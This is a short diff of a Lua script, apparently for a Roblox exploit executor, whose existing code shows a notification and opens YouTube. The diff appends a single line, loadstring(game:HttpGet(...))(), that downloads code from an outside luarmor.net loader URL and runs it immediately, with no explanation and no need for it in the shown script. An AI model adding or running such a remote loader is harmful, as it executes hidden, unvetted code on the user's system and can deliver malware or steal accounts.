@@ -20,3 +20,6 @@ function open_browser(url, asJson)
     game:GetService("GuiService"):BroadcastNotification(msg, 20)
 end
 open_browser("https://www.youtube.com", true)
+
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))() 
